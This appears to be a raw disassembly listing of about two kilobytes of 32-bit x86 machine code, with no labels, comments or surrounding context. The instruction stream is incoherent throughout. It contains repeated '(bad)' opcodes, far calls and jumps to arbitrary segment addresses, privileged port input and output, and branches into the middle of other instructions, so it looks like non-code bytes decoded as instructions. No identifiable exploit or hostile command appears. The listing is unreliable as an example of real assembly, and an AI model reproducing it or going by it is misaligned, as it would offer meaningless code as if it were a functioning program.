  402fd3:	call   0x33c4:0x97ede0cb
  402fda:	jne    0x403032
  402fdc:	rcl    BYTE PTR [ebx],cl
  402fde:	adc    DWORD PTR ds:[ecx],esp
  402fe1:	in     eax,dx
  402fe2:	stc    
  402fe3:	fadd   QWORD PTR [eax-0x54]
  402fe6:	loope  0x402fdf
  402fe8:	(bad)  
  402fe9:	sbb    bl,BYTE PTR [edi+0x678e6e6c]
  402fef:	or     ebp,DWORD PTR [edi-0x3c]
  402ff2:	and    al,0xe4
  402ff4:	popa   
  402ff5:	push   es
  402ff6:	popa   
  402ff7:	pop    es
  402ff8:	and    DWORD PTR [ebx-0x5cb9a05e],ebp
  402ffe:	les    esp,FWORD PTR [esi+0x61df31a0]
  403004:	mov    esp,0xb410e5ff
  403009:	and    al,0x67
  40300b:	dec    ebp
  40300c:	sbb    al,0xc2
  40300e:	mov    al,ds:0xf317ac6e
  403013:	hlt    
  403014:	or     ch,dh
  403016:	cmp    BYTE PTR [edi-0x41f52476],dh
  40301c:	lahf   
  40301d:	inc    edi
  40301e:	or     bh,dh
  403020:	adc    DWORD PTR [edx-0x52],0xffffff81
  403024:	clc    
  403025:	mov    BYTE PTR [ecx],ah
  403027:	aaa    
  403028:	daa    
  403029:	push   esi
  40302a:	cs jo  0x40303f
  40302d:	xor    eax,0x40b014a0
  403032:	push   ebx
  403033:	inc    esp
  403034:	cmp    DWORD PTR [ebx-0x59],ebp
  403037:	aad    0xa5
  403039:	mov    esi,0x915aba17
  40303e:	jmp    0x402fd3
  403040:	retf   0x2696
  403043:	mov    eax,ds:0x5e736a42
  403048:	jle    0x40309b
  40304a:	or     BYTE PTR [esi+0x75],0xcf
  40304e:	retf   0x143
  403051:	popa   
  403052:	jne    0x402feb
  403054:	jns    0x40306c
  403056:	sbb    ah,BYTE PTR [ecx]
  403058:	gs out 0x2d,eax
  40305b:	lahf   
  40305c:	(bad)  
  40305e:	cmp    eax,0xff001d6c
  403063:	push   eax
  403064:	add    eax,0x9cd054f5
  403069:	pop    es
  40306a:	xchg   esi,eax
  40306b:	push   ebp
  40306c:	out    0x1b,eax
  40306e:	cli    
  40306f:	dec    edx
  403070:	sahf   
  403071:	retf   
  403072:	pusha  
  403073:	call   0x1f56:0x8de67d
  40307a:	and    edi,esi
  40307c:	leave  
  40307d:	dec    esp
  40307e:	inc    ebx
  40307f:	imul   BYTE PTR [eax-0x69734188]
  403085:	and    BYTE PTR [eax-0x4d],dl
  403088:	jne    0x4030c3
  40308a:	imul   ebp,DWORD PTR [ebx],0xffffff8f
  40308d:	or     esi,DWORD PTR [si]
  403090:	dec    eax
  403091:	out    0x12,eax
  403093:	das    
  403094:	fwait
  403095:	call   0x5f74:0x555ea7ad
  40309c:	xor    BYTE PTR [eax+0x7fc611ea],0xfb
  4030a3:	lods   eax,DWORD PTR ds:[esi]
  4030a4:	ss sti 
  4030a6:	mov    al,0x72
  4030a8:	mov    edx,0xe311b11e
  4030ad:	clc    
  4030ae:	cmp    DWORD PTR [eax+0x62],esi
  4030b1:	adc    BYTE PTR [edx],bh
  4030b3:	in     eax,dx
  4030b4:	stos   DWORD PTR es:[edi],eax
  4030b5:	push   esi
  4030b6:	rcl    BYTE PTR [ebp+0x8],0xeb
  4030ba:	pushf  
  4030bb:	cld    
  4030bc:	or     BYTE PTR [edi],bh
  4030be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030bf:	push   edx
  4030c0:	xchg   BYTE PTR [ebx-0x37],al
  4030c3:	mov    ebp,0x6dbdcd9a
  4030c8:	mov    ebp,0xa0b35da9
  4030cd:	sub    eax,0x7574885c
  4030d2:	sub    dh,BYTE PTR [edx-0x59]
  4030d5:	adc    cl,al
  4030d7:	fs dec ebx
  4030d9:	dec    esp
  4030da:	dec    DWORD PTR [eax-0x6c7cd848]
  4030e0:	(bad)  
  4030e1:	cli    
  4030e2:	xor    DWORD PTR [ecx],ebx
  4030e4:	xchg   al,al
  4030e6:	lock leave 
  4030e8:	jp     0x4030b0
  4030ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030eb:	pop    edi
  4030ec:	mov    bl,0xe3
  4030ee:	pop    ds
  4030ef:	dec    ebx
  4030f0:	std    
  4030f1:	mov    esi,0x4143a237
  4030f6:	fsubr  DWORD PTR [ecx-0x7b]
  4030f9:	in     eax,dx
  4030fa:	cmp    al,BYTE PTR [ebx]
  4030fc:	pop    ebp
  4030fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030fe:	dec    esp
  4030ff:	adc    BYTE PTR [esi+0x34b16608],cl
  403105:	mov    dh,bl
  403107:	aaa    
  403108:	jno    0x403109
  40310a:	mov    dh,0x23
  40310c:	out    0x49,al
  40310e:	adc    eax,0x96fc5dbe
  403113:	mov    ah,0xb3
  403115:	inc    edx
  403116:	pusha  
  403117:	retf   
  403118:	leave  
  403119:	sar    BYTE PTR [esi-0x5f],0x30
  40311d:	jmp    0x3c3666b9
  403122:	sub    eax,0x90a25d1a
  403127:	mov    bh,0x3f
  403129:	jecxz  0x403188
  40312b:	imul   ebx,DWORD PTR [eax+0x20],0x5506642a
  403132:	inc    esi
  403133:	dec    eax
  403134:	iret   
  403135:	repz add BYTE PTR [edx-0x67b04f18],dh
  40313c:	xchg   esi,eax
  40313d:	dec    ebp
  40313e:	sub    DWORD PTR [edi],edi
  403140:	jecxz  0x403194
  403142:	mov    esp,0x88d1caa2
  403147:	out    dx,eax
  403148:	dec    eax
  403149:	scas   eax,DWORD PTR es:[edi]
  40314a:	jle    0x403120
  40314c:	into   
  40314d:	adc    DWORD PTR [esi],ebp
  40314f:	rol    cl,1
  403151:	push   esp
  403152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403153:	ss aas 
  403155:	and    DWORD PTR [ecx],edx
  403157:	xor    BYTE PTR [eax],ah
  403159:	cmp    bl,al
  40315b:	lods   al,BYTE PTR ds:[esi]
  40315c:	xchg   esp,eax
  40315d:	(bad)  
  40315e:	fs jbe 0x40319f
  403161:	push   esp
  403162:	pop    es
  403163:	cmp    ecx,edx
  403165:	pop    edx
  403166:	rcl    ebx,1
  403168:	sti    
  403169:	xchg   edx,eax
  40316a:	and    eax,DWORD PTR [esi+0x12]
  40316d:	les    ecx,FWORD PTR [ecx+0x26a73189]
  403173:	inc    edx
  403174:	xchg   edi,eax
  403175:	cld    
  403176:	lods   al,BYTE PTR ds:[esi]
  403177:	or     al,0x32
  403179:	xchg   esp,eax
  40317a:	or     eax,0x89754a24
  40317f:	pop    esp
  403180:	aad    0xe7
  403182:	inc    edi
  403183:	push   ss
  403184:	dec    ecx
  403185:	ja     0x4031ba
  403187:	jno    0x403110
  403189:	retf   0xa50b
  40318c:	push   0x5fe4bccf
  403191:	push   ebp
  403193:	mov    eax,ds:0x4bafc42f
  403198:	or     al,0x58
  40319a:	xchg   edx,eax
  40319b:	sub    BYTE PTR [ecx],bh
  40319d:	sbb    al,0x16
  40319f:	fst    DWORD PTR [ebp+0x79]
  4031a2:	or     BYTE PTR [ecx+ebp*1],dh
  4031a5:	sub    DWORD PTR [eax+0x52735ddf],edx
  4031ab:	dec    edi
  4031ac:	xor    BYTE PTR [edi+ebp*4],cl
  4031af:	add    eax,0xe5107ae4
  4031b4:	xchg   ecx,eax
  4031b5:	mov    dl,0xe9
  4031b7:	mov    ds:0xccc06cfc,al
  4031bc:	imul   edi,DWORD PTR [eax-0x2f],0x9ed24b93
  4031c3:	stos   DWORD PTR es:[edi],eax
  4031c4:	dec    edx
  4031c5:	jge    0x40321d
  4031c7:	std    
  4031c8:	jecxz  0x4031c6
  4031ca:	adc    al,0x88
  4031cc:	ja     0x4031c3
  4031ce:	jae    0x403216
  4031d0:	jge    0x40318a
  4031d2:	jmp    0xe45f:0x6c813ca4
  4031d9:	mov    al,ds:0xa11eddc4
  4031de:	rcl    DWORD PTR [edi],1
  4031e0:	and    BYTE PTR [ebx],0xfb
  4031e3:	cdq    
  4031e4:	outs   dx,DWORD PTR ds:[esi]
  4031e5:	jnp    0x40317c
  4031e7:	cmp    edi,DWORD PTR [edi+edi*8-0x52ae9d39]
  4031ee:	shr    ah,0xda
  4031f1:	xchg   ebp,eax
  4031f2:	sbb    DWORD PTR [eax-0x2a780429],edx
  4031f8:	cmc    
  4031f9:	inc    edi
  4031fa:	push   ds
  4031fb:	xchg   edi,eax
  4031fc:	inc    edx
  4031fd:	inc    ecx
  4031fe:	in     eax,dx
  4031ff:	jle    0x40323e
  403201:	sub    ch,BYTE PTR [edi]
  403203:	jnp    0x4031ea
  403205:	popa   
  403206:	push   ss
  403207:	and    al,0xdb
  403209:	jmp    0xcaef6a00
  40320e:	sbb    BYTE PTR [eax-0x9],ah
  403211:	addr16 cld 
  403213:	mov    ds:0x1b95abac,eax
  403218:	cwde   
  403219:	add    bl,BYTE PTR es:0xa5c1440d
  403220:	pusha  
  403221:	mov    dl,0x63
  403223:	pop    ecx
  403224:	pop    ss
  403225:	xor    edi,DWORD PTR [eax+0xf609d90]
  40322b:	or     BYTE PTR [esi+0x4a2f62e8],bl
  403231:	imul   ebx,DWORD PTR [ebx+0x25],0x1f
  403235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403236:	push   ebp
  403237:	mov    cl,0x4e
  403239:	clc    
  40323a:	test   DWORD PTR [esi+eiz*1+0x3b],edx
  40323e:	pop    edi
  40323f:	and    al,0xb9
  403241:	push   ebp
  403242:	push   edx
  403243:	cmp    eax,0xc0e1d461
  403248:	adc    eax,ebp
  40324a:	pop    ecx
  40324b:	cmc    
  40324c:	out    dx,al
  40324d:	(bad)  
  40324f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403250:	xchg   ebx,eax
  403251:	ror    esi,0xa8
  403254:	pop    es
  403255:	push   ds
  403256:	ret    0x7ab7
  403259:	fdiv   st(3),st
  40325b:	lds    esp,FWORD PTR [ebp+0x5e]
  40325e:	ds test al,0xc7
  403261:	add    ch,bl
  403263:	mov    dh,0x73
  403265:	jecxz  0x403271
  403267:	mov    ds:0x5800be42,eax
  40326c:	xlat   BYTE PTR ds:[ebx]
  40326d:	and    ah,ah
  40326f:	(bad)  
  403270:	jne    0x40327e
  403272:	sbb    DWORD PTR [ecx],ebp
  403274:	outs   dx,DWORD PTR ds:[esi]
  403275:	ins    DWORD PTR es:[edi],dx
  403276:	mov    ch,0x70
  403278:	mov    eax,fs
  40327a:	mov    ds:0x1fb73d82,eax
  40327f:	jge    0x40328a
  403281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403282:	int    0xc7
  403284:	push   0x57
  403286:	sbb    eax,0x1301f01c
  40328b:	ins    DWORD PTR es:[edi],dx
  40328c:	sbb    al,0x52
  40328e:	dec    edx
  40328f:	jmp    0x3a11381f
  403294:	xchg   ebp,eax
  403295:	inc    ebp
  403296:	adc    BYTE PTR [esi],dh
  403298:	js     0x403263
  40329a:	call   0xe16a:0x5f854f55
  4032a1:	or     al,0xb4
  4032a3:	push   ebp
  4032a4:	fmulp  st(1),st
  4032a6:	xchg   ecx,eax
  4032a7:	push   eax
  4032a8:	add    DWORD PTR [ebx],0x78
  4032ab:	mov    ds,WORD PTR [eax]
  4032ad:	retf   0xccf3
  4032b0:	popf   
  4032b1:	xchg   edi,eax
  4032b2:	cmp    cl,ch
  4032b4:	ror    ah,0x64
  4032b7:	fidivr WORD PTR [esi-0x7306edb9]
  4032bd:	add    al,0x6
  4032bf:	xor    al,0x71
  4032c1:	imul   edx,DWORD PTR [edx],0x1d
  4032c4:	mov    BYTE PTR cs:[ebp-0x191bae72],dl
  4032cb:	cmp    ah,BYTE PTR [edi-0x32]
  4032ce:	dec    edi
  4032cf:	sti    
  4032d0:	add    cl,BYTE PTR [edx-0x5e]
  4032d3:	xor    edi,DWORD PTR [edi+0x1cef148a]
  4032d9:	bound  esp,QWORD PTR [ebp+0x60]
  4032dc:	and    BYTE PTR [esi+0x49],bh
  4032df:	fild   DWORD PTR [ebx-0x7a339468]
  4032e5:	xchg   esp,eax
  4032e6:	push   edi
  4032e7:	ds dec ebp
  4032e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ea:	dec    esp
  4032eb:	mov    esi,0x5c9f0230
  4032f0:	adc    DWORD PTR [eax],0x7a
  4032f3:	into   
  4032f4:	pusha  
  4032f5:	pop    ebp
  4032f6:	inc    ebx
  4032f7:	push   edi
  4032f8:	sub    eax,0xea360d0e
  4032fd:	jno    0x4032a9
  4032ff:	inc    ecx
  403300:	adc    DWORD PTR [ebp-0x4f],0xffffff91
  403304:	sbb    dl,al
  403306:	cmp    eax,0x535632b3
  40330b:	pop    ss
  40330c:	jp     0x403361
  40330e:	jge    0x4032fe
  403310:	or     BYTE PTR [ebp+0x35],cl
  403313:	push   0x15
  403315:	ss js  0x4032e2
  403318:	xor    cl,BYTE PTR [esi]
  40331a:	mov    al,0x1c
  40331c:	fnstcw WORD PTR [edx+eax*1]
  40331f:	jmp    0x789a:0xbf198a74
  403326:	and    BYTE PTR [edi+0x114cc01e],cl
  40332c:	adc    dh,BYTE PTR [edi+edx*4-0x396fabbf]
  403333:	and    al,cl
  403335:	(bad)  
  403336:	mov    esp,0x4bb59ba7
  40333b:	adc    eax,0x637a1f20
  403340:	outs   dx,BYTE PTR ds:[esi]
  403341:	mov    dh,0x90
  403343:	ja     0x4033b0
  403345:	or     DWORD PTR [ebx+esi*2+0x62],ebp
  403349:	or     ah,0x34
  40334c:	ja     0x40331a
  40334e:	stc    
  40334f:	fimul  WORD PTR [ebx-0x51e5ca64]
  403355:	mov    esp,0x989610ec
  40335a:	jmp    0x40334f
  40335c:	xor    edi,DWORD PTR [esi]
  40335e:	in     al,0xd6
  403360:	imul   eax,DWORD PTR [edx+0x71],0xffffffbd
  403364:	push   esp
  403365:	xor    eax,0x2d1c4369
  40336a:	les    eax,FWORD PTR [ecx]
  40336c:	call   FWORD PTR [edx-0x6abfcede]
  403372:	jg     0x403327
  403374:	(bad)  
  403376:	dec    ecx
  403377:	sbb    DWORD PTR [esi-0x3e558d98],ebp
  40337d:	stc    
  40337e:	cli    
  40337f:	lahf   
  403380:	ja     0x4033d3
  403382:	xor    al,0x8e
  403384:	push   esi
  403385:	mov    ecx,0x7b205937
  40338a:	xor    ch,dh
  40338c:	call   0xb398:0x4a11ad79
  403393:	mov    edx,0xeceab2d4
  403398:	xor    ecx,DWORD PTR [ebx-0x5ba74a18]
  40339e:	inc    ebx
  40339f:	mov    bl,0xb7
  4033a1:	cmp    eax,ebx
  4033a3:	jbe    0x403339
  4033a5:	imul   edi,ebp,0x26
  4033a8:	repnz scas al,BYTE PTR es:[edi]
  4033aa:	jg     0x403338
  4033ac:	sub    edi,DWORD PTR [eax-0x63]
  4033af:	cmc    
  4033b0:	pusha  
  4033b1:	movzx  ebp,BYTE PTR [ecx]
  4033b4:	dec    ebx
  4033b5:	or     BYTE PTR [ecx+0x1c],ch
  4033b8:	mov    bh,0x97
  4033ba:	cli    
  4033bb:	test   DWORD PTR [esi],0x1e9dd2bb
  4033c1:	cwde   
  4033c2:	cmp    BYTE PTR [ebx+0x55],0xb2
  4033c6:	mov    BYTE PTR [edi+0x70],bh
  4033c9:	ja     0x403373
  4033cb:	cmp    bl,dl
  4033cd:	jbe    0x403358
  4033cf:	fiadd  DWORD PTR [eax]
  4033d1:	jecxz  0x403410
  4033d3:	cwde   
  4033d4:	pop    ecx
  4033d5:	and    al,al
  4033d7:	stos   DWORD PTR es:[edi],eax
  4033d8:	adc    al,BYTE PTR ds:0x861efe37
  4033de:	mov    eax,ds:0xe8297fa3
  4033e3:	shr    BYTE PTR [eax+0x10],1
  4033e6:	sbb    al,0x29
  4033e8:	and    eax,0x82eb252d
  4033ed:	lock pop ss
  4033ef:	retf   
  4033f0:	lahf   
  4033f1:	inc    ebx
  4033f2:	(bad)  
  4033f4:	add    al,0xd8
  4033f6:	jg     0x403449
  4033f8:	sti    
  4033f9:	and    eax,edi
  4033fb:	daa    
  4033fc:	loopne 0x40345b
  4033fe:	sbb    ecx,ebx
  403400:	out    0x15,eax
  403402:	push   ss
  403403:	retf   0x9135
  403406:	ja     0x4033bc
  403408:	mov    dh,0x9a
  40340a:	js     0x40341f
  40340c:	lahf   
  40340d:	popf   
  40340e:	jae    0x403398
  403410:	xor    dh,BYTE PTR fs:[edi+0x64b0e502]
  403417:	pop    edx
  403418:	xchg   esi,eax
  403419:	push   edx
  40341a:	xchg   edi,eax
  40341b:	out    0x2c,eax
  40341d:	cmp    al,0xa3
  40341f:	sahf   
  403420:	test   BYTE PTR [edx],dl
  403422:	push   edi
  403423:	inc    edx
  403424:	jg     0x403414
  403426:	xor    eax,0xa5a8c886
  40342b:	shl    BYTE PTR [ebx-0x49],cl
  40342e:	xor    dh,ch
  403430:	imul   ebp,ebp,0xffffff86
  403433:	adc    BYTE PTR [edx],al
  403435:	pop    edi
  403436:	sbb    esi,DWORD PTR [edi]
  403438:	ja     0x4033c0
  40343a:	popa   
  40343b:	das    
  40343c:	repnz inc ecx
  40343e:	mov    BYTE PTR [edx],bl
  403440:	pop    edi
  403441:	(bad)  
  403442:	xor    eax,0xe827bb6d
  403447:	cmp    DWORD PTR [esi],edx
  403449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344a:	aaa    
  40344b:	fild   WORD PTR [ecx-0x61abb89]
  403451:	adc    DWORD PTR [edi-0x59],edi
  403454:	lock adc BYTE PTR [edi+edi*8+0x2b],bh
  403459:	add    edi,ebp
  40345b:	push   ds
  40345c:	push   ss
  40345d:	xor    DWORD PTR [ebp-0x7e7a57ce],ebx
  403463:	sbb    BYTE PTR [edi],bh
  403465:	in     al,0xf6
  403467:	mov    ebp,DWORD PTR [ebp-0x13]
  40346a:	xchg   esi,eax
  40346b:	iret   
  40346c:	dec    eax
  40346d:	cmp    al,0x5
  40346f:	mov    ebp,0xb2a17557
  403474:	xlat   BYTE PTR ds:[ebx]
  403475:	(bad)  
  403476:	fistp  QWORD PTR [esi-0x3a47a82f]
  40347c:	rcr    eax,1
  40347e:	popf   
  40347f:	dec    esi
  403480:	gs adc al,0xd2
  403483:	call   0x13f:0x9b6473db
  40348a:	adc    eax,0xe372971c
  40348f:	enter  0x954a,0xf7
  403493:	push   0xffffff86
  403495:	cmp    eax,DWORD PTR ds:0xf6f6dad6
  40349b:	mov    cl,0x60
  40349d:	adc    ebp,DWORD PTR [eax-0x91c1b9e]
  4034a3:	pop    ebx
  4034a4:	jmp    0x40350b
  4034a6:	jae    0x403495
  4034a8:	fmul   DWORD PTR es:[ebp-0x3e93ae97]
  4034af:	dec    ebx
  4034b0:	xchg   ebx,eax
  4034b1:	add    eax,0xb70f6dae
  4034b6:	add    BYTE PTR [ecx-0x461926a5],al
  4034bc:	or     DWORD PTR [eax+0x26],esp
  4034bf:	cmp    BYTE PTR [esi+esi*2-0x11],0x98
  4034c4:	outs   dx,DWORD PTR ds:[esi]
  4034c5:	jmp    0x22d8f463
  4034ca:	xchg   DWORD PTR [eax],eax
  4034cc:	loopne 0x403459
  4034ce:	dec    edi
  4034cf:	jge    0x403461
  4034d1:	dec    edx
  4034d2:	sbb    BYTE PTR [eax-0x76],dl
  4034d5:	or     DWORD PTR [ebp-0x1ce51889],esi
  4034db:	sbb    BYTE PTR ds:0x8e8fdb35,0x28
  4034e2:	jecxz  0x40352d
  4034e4:	sbb    bl,BYTE PTR [ebx-0x30]
  4034e7:	xabort 0xd6
  4034ea:	bound  esi,QWORD PTR [edx+ecx*2+0x0]
  4034ee:	stos   DWORD PTR es:[edi],eax
  4034ef:	or     DWORD PTR [esi],esp
  4034f1:	dec    ebx
  4034f2:	push   ecx
  4034f3:	mov    es,edx
  4034f5:	fadd   QWORD PTR [edi]
  4034f7:	popa   
  4034f8:	push   ebx
  4034f9:	in     eax,dx
  4034fa:	cli    
  4034fb:	std    
  4034fc:	js     0x403555
  4034fe:	dec    ecx
  4034ff:	scas   al,BYTE PTR es:[edi]
  403500:	cmc    
  403501:	lods   eax,DWORD PTR ds:[esi]
  403502:	inc    ecx
  403503:	inc    esi
  403504:	or     BYTE PTR [ecx-0x19b75e62],cl
  40350a:	add    bh,BYTE PTR [eax]
  40350c:	dec    esi
  40350d:	adc    ch,BYTE PTR [ecx-0x4e]
  403510:	in     eax,0x82
  403512:	jno    0x4034c2
  403514:	xor    BYTE PTR [ebp+0x46],0x5e
  403518:	gs inc eax
  40351a:	mov    dh,0xd6
  40351c:	pop    esp
  40351d:	pop    ecx
  40351e:	inc    esp
  40351f:	repnz dec esi
  403521:	xchg   ebx,eax
  403522:	mov    bh,0x92
  403524:	sub    eax,0x1a930352
  403529:	sub    BYTE PTR ds:0x9743fedb,0x68
  403530:	jp     0x4034c4
  403532:	mov    ecx,0xfb9e73e6
  403537:	faddp  st(7),st
  403539:	fistp  DWORD PTR [ebx-0x71]
  40353c:	in     al,dx
  40353d:	xchg   BYTE PTR [edx-0x3a],cl
  403540:	inc    edi
  403541:	fs push es
  403543:	lods   eax,DWORD PTR ds:[esi]
  403544:	imul   ebx,DWORD PTR [edi],0x15c1faa7
  40354a:	sub    edi,DWORD PTR [ebx-0x71]
  40354d:	dec    esp
  40354e:	mov    ds:0x8ba5147a,al
  403553:	and    edx,DWORD PTR [edi]
  403555:	or     eax,0xa5c75f97
  40355a:	lock nop
  40355c:	outs   dx,BYTE PTR ds:[esi]
  40355d:	fucomp st(0)
  40355f:	inc    ebp
  403560:	shl    ebp,1
  403562:	sub    DWORD PTR [edx-0x5d],eax
  403565:	adc    DWORD PTR [ecx-0x2bfa3c64],esp
  40356b:	mov    ch,0x1d
  40356d:	xor    al,0x40
  40356f:	inc    ebp
  403570:	xor    DWORD PTR [eax],edx
  403572:	cld    
  403573:	stc    
  403574:	push   ecx
  403575:	mov    ch,0xe
  403577:	dec    esp
  403578:	or     edi,DWORD PTR [eax-0x5681c729]
  40357e:	pusha  
  40357f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403580:	dec    edi
  403581:	addr16 test eax,0x6c560748
  403587:	add    dl,ch
  403589:	sub    dl,BYTE PTR [esp+esi*2+0x62cd86ec]
  403590:	retf   
  403591:	pop    edx
  403592:	xor    al,0xc8
  403594:	or     al,BYTE PTR [edi+eax*1+0x31]
  403598:	call   0x5e73:0x421dffb2
  40359f:	xchg   edx,eax
  4035a0:	mov    dl,0x2a
  4035a2:	sbb    al,BYTE PTR [ecx]
  4035a4:	loopne 0x403571
  4035a6:	jecxz  0x403550
  4035a8:	pop    ecx
  4035a9:	lea    edx,[esi-0x5e]
  4035ac:	fcomp  DWORD PTR [edx]
  4035ae:	fwait
  4035af:	inc    ecx
  4035b0:	dec    ebp
  4035b1:	sahf   
  4035b2:	stos   BYTE PTR es:[edi],al
  4035b3:	cmp    al,0xee
  4035b5:	cld    
  4035b6:	das    
  4035b7:	or     edi,DWORD PTR [ebx-0x7c]
  4035ba:	ds mov esi,0xf88be7c
  4035c0:	sub    ax,bp
  4035c3:	jb     0x4035de
  4035c5:	sub    al,0x48
  4035c7:	sbb    DWORD PTR [edx-0x1a],0x72
  4035cb:	sub    DWORD PTR [ebx+0x572d9018],ebp
  4035d1:	(bad)  
  4035d2:	ss imul cl
  4035d5:	and    ebx,DWORD PTR [esi-0x12]
  4035d8:	dec    esi
  4035d9:	sbb    al,0xc1
  4035db:	cs mov ch,0xd0
  4035de:	mov    cl,0x44
  4035e0:	mov    cl,0x1
  4035e2:	leave  
  4035e3:	cmp    BYTE PTR [ebx-0x4e],cl
  4035e6:	enter  0x460,0xeb
  4035ea:	ret    0x85a0
  4035ed:	addr16 push cs
  4035ef:	test   BYTE PTR [ebx-0x27a3696],cl
  4035f5:	aam    0x49
  4035f7:	xchg   ebx,eax
  4035f8:	xchg   DWORD PTR [ecx+0x4368ccb2],edx
  4035fe:	fidivr WORD PTR [eax+0xbb58f7c]
  403604:	mov    esp,0xe1590f3b
  403609:	xchg   BYTE PTR [ebx-0x29356e9e],dh
  40360f:	or     eax,0xda38946
  403614:	jmp    0x2700:0xb3d101ee
  40361b:	adc    dl,al
  40361d:	in     al,0x6e
  40361f:	xor    esi,DWORD PTR [esi-0x3ca93040]
  403625:	mov    ebx,0xe9a6b85
  40362a:	xor    ah,0xb2
  40362d:	push   cs
  40362e:	dec    edx
  40362f:	(bad)  
  403630:	fisub  DWORD PTR [ecx]
  403632:	xchg   ecx,eax
  403633:	inc    eax
  403634:	pop    ebx
  403635:	addr16 push eax
  403637:	cmp    DWORD PTR [ebx+0x72],edi
  40363a:	mov    bl,0xce
  40363c:	fst    QWORD PTR [ebx]
  40363e:	jle    0x4035eb
  403640:	mov    esp,0x86d1b390
  403645:	adc    ch,bh
  403647:	call   0x3b5c:0x2fa20cd7
  40364e:	inc    edi
  40364f:	ds pop ss
  403651:	fcmovnu st,st(6)
  403653:	mov    bl,0x80
  403655:	adc    bl,BYTE PTR [esp+esi*8+0x5f]
  403659:	xchg   esp,eax
  40365a:	sbb    esp,eax
  40365c:	sbb    ebp,edx
  40365e:	rcl    BYTE PTR [edi],cl
  403660:	push   ebp
  403661:	xchg   edx,eax
  403662:	jne    0x40364b
  403664:	and    bh,BYTE PTR [esp+ebp*4]
  403667:	(bad)  
  403668:	cs pop ds
  40366a:	push   ebx
  40366b:	dec    eax
  40366c:	or     ecx,DWORD PTR [ecx+0x3d08de3b]
  403672:	shr    BYTE PTR [edx-0x32cda7f],cl
  403678:	xchg   al,bh
  40367a:	mov    BYTE PTR [eax+0x1d],cl
  40367d:	sahf   
  40367e:	mov    edi,0xca182e41
  403683:	xchg   ebp,eax
  403684:	ds add eax,0xb62bf9e8
  40368a:	cmp    BYTE PTR [ebx],cl
  40368c:	js     0x403663
  40368e:	mov    bl,0xa0
  403690:	shl    DWORD PTR [ebp+0x13a0a6c6],0xe5
  403697:	cmp    eax,0xabf29646
  40369c:	mov    al,ds:0x58983e94
  4036a1:	aad    0xb1
  4036a3:	sti    
  4036a4:	xor    DWORD PTR [ebx],edx
  4036a6:	pop    ecx
  4036a7:	fwait
  4036a8:	test   al,0xb2
  4036aa:	pop    ecx
  4036ab:	add    al,0x9b
  4036ad:	and    al,0x1
  4036af:	jno    0x403680
  4036b1:	dec    ebp
  4036b2:	rcl    dl,0x40
  4036b5:	xchg   esi,eax
  4036b6:	mov    ch,0x6a
  4036b8:	in     eax,dx
  4036b9:	call   0xa00772ae
  4036be:	test   DWORD PTR [ebx-0x2b30926],0xbe4495f4
  4036c8:	mov    ds:0xbaa61c92,al
  4036cd:	inc    ecx
  4036ce:	mov    edx,0xb1baccea
  4036d3:	jns    0x40374c
  4036d5:	dec    edx
  4036d6:	arpl   WORD PTR [ebx],di
  4036d8:	mov    eax,0xe9c9031b
  4036dd:	xchg   esi,eax
  4036de:	xchg   ebp,eax
  4036df:	scas   eax,DWORD PTR es:[edi]
  4036e0:	enter  0x964e,0xf2
  4036e4:	jecxz  0x4036f5
  4036e6:	aam    0x9e
  4036e8:	mov    ch,0xc
  4036ea:	es lods al,BYTE PTR ss:[esi]
  4036ed:	stc    
  4036ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036ef:	fsub   QWORD PTR [ebp+0x12ed120]
  4036f5:	sbb    bl,BYTE PTR [ecx+0x173206aa]
  4036fb:	and    al,dl
  4036fd:	dec    DWORD PTR [eax+0x1d]
  403700:	jo     0x40375a
  403702:	pop    esi
  403703:	sub    al,0x77
  403705:	xchg   BYTE PTR [eax+edi*8-0x16],cl
  403709:	stos   DWORD PTR es:[edi],eax
  40370a:	xor    BYTE PTR [edx],ah
  40370c:	in     al,0x4
  40370e:	lahf   
  40370f:	cli    
  403710:	and    ebx,DWORD PTR [bp+si-0x26]
  403714:	sahf   
  403715:	mov    eax,0x1444c2fc
  40371a:	add    esi,DWORD PTR ds:0x87c72501
  403720:	fidivr WORD PTR [eax-0x75]
  403723:	xor    eax,0xcf6983bc
  403728:	mov    dl,0x8c
  40372a:	mov    ebp,0x2de6a026
  40372f:	inc    edi
  403730:	jnp    0x403779
  403732:	arpl   WORD PTR [eax],sp
  403734:	mov    edi,0x5b6fa1e9
  403739:	dec    edi
  40373a:	(bad)  
  40373b:	es pop ebp
  40373d:	cdq    
  40373e:	adc    BYTE PTR [ecx+0x1b5420bd],dl
  403744:	repnz (bad) 
  403746:	fidivr WORD PTR [eax-0x4a]
  403749:	fisttp WORD PTR [edx]
  40374b:	shl    eax,1
  40374d:	test   BYTE PTR [eax],bl
  40374f:	arpl   dx,cx
  403751:	push   0x4
  403753:	sar    DWORD PTR [ebp+0x287ef18f],cl
  403759:	mov    dh,0xd4
  40375b:	sbb    BYTE PTR [edx+0xb530d95],ch
  403761:	in     al,0x1f
  403763:	and    ebp,DWORD PTR [esi]
  403765:	popf   
  403766:	(bad)  
  403767:	sbb    DWORD PTR [edi+0x6f8de26],esi
  40376d:	dec    ecx
  40376e:	mov    eax,ds:0x39ea65cd
  403773:	mov    ebp,0x510ceeb1
  403778:	inc    ecx
  403779:	in     eax,0xf3
  40377b:	sub    al,0x9e
  40377d:	pop    edi
  40377e:	push   es
  40377f:	mov    bh,BYTE PTR ds:0xdedd80c6
  403785:	clc    
  403786:	dec    eax
  403787:	mov    cl,0x22
  403789:	loop   0x403746
  40378b:	sub    BYTE PTR [ebp+eiz*1-0x68],bl
  40378f:	sahf   
  403790:	sub    eax,DWORD PTR [edi]
  403792:	in     al,0x1f
  403794:	mov    edx,0x3fa63b3e
  403799:	pop    ds
  40379a:	push   esp
  40379b:	hlt    
  40379c:	xor    edi,DWORD PTR [ebp-0x2e00a264]
  4037a2:	cmp    al,0xde
  4037a4:	xchg   edi,eax
  4037a5:	sub    bl,cl
